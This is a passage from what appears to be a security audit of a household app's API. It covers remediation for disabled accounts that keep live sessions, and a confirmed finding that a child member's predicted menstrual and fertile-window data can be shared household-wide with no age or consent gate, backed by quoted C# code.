in OnTokenValidated, or gate presence endpoints with an IsEnabled-aware filter.

Remediation (approach)

Make disabling an account also invalidate live sessions: when PUT /api/users/{id} transitions IsEnabled to false, increment SessionVersion in the same transaction (and drop the user from presence / push SessionRevoked), so the stale token is rejected on the next request exactly as force-logout does. Alternatively (defense in depth) have OnTokenValidated fail the token when the loaded user is not enabled, and/or add an IsEnabled re-check to the presence endpoints so an auth-only route can never be served to a disabled principal.

Medium Security Endpoints: family / health / identity CONFIRMED conf: medium 1 verifier

Cycle overlay surfaces a CHILD member's predicted menstrual/fertile spans household-wide with a single self-serve toggle and no age/consent gate

src/Api/Endpoints/CycleOverlayEndpoints.cs:54-101 Sensitive health data access control / over-sharing
Evidence
var optedInOthers = await db.CycleProfiles.AsNoTracking()
    .Where(p => p.OverlayToFamily && p.UserId != caller.Id && memberIds.Contains(p.UserId))
    .Select(p => p.UserId)
    .ToListAsync(ct);
...
result.Add(new MemberOverlayDto(
    u.Id,
    DisplayName.Format(u.Name, u.DisplayNameMode, u.Nickname),
    spans.Select(s => new PhaseSpanDto(s.Kind, s.Start, s.End, true)).ToList()));
Why it matters (enterprise impact)

The prior round noted the VIEWER side (any family.use holder, incl. children, can read the overlay). The distinct, unreported defect is the SUBJECT side: the opt-in query filters only on OverlayToFamily and household membership — it never consults HouseholdMember.Role. A member whose Role is 'child' (a minor) who flips the OverlayToFamily toggle has their predicted period/fertile-window spans broadcast to every other member of the household, including other children. For a minor's intimate reproductive-health prediction, a single self-serve boolean with no adult/guardian gate and no age check is a meaningful consent/over-sharing failure for an app that markets privacy-first handling of cycle data.

Independent verifier — confirmation
CycleOverlayEndpoints.cs:54-57 — `var optedInOthers = await db.CycleProfiles.AsNoTracking().Where(p => p.OverlayToFamily && p.UserId != caller.Id && memberIds.Contains(p.UserId)).Select(p => p.UserId).ToListAsync(ct);` (no Role check). Subject-side toggle is self-serve: CycleEndpoints.cs:222 — `if (req.OverlayToFamily is bool o) profile.OverlayToFamily = o;` on the caller's own profile.
